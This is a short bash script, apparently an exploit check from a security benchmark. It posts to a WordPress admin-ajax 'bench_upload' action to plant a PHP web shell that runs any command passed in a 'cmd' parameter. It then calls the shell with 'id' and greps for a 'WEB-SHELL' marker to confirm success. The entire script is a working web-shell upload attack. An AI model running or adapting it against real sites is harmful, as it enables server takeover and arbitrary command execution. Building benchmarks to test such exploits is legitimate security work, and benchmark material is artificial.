#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
name="shell_$$.php"
url=$(curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" --data-urlencode "action=bench_upload" --data-urlencode "filename=$name" --data-urlencode "content=<?php system(\$_GET[cmd]); ?>" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("uploaded",""))')
curl -s "$TARGET$url?cmd=id" | grep -q "WEB-SHELL"
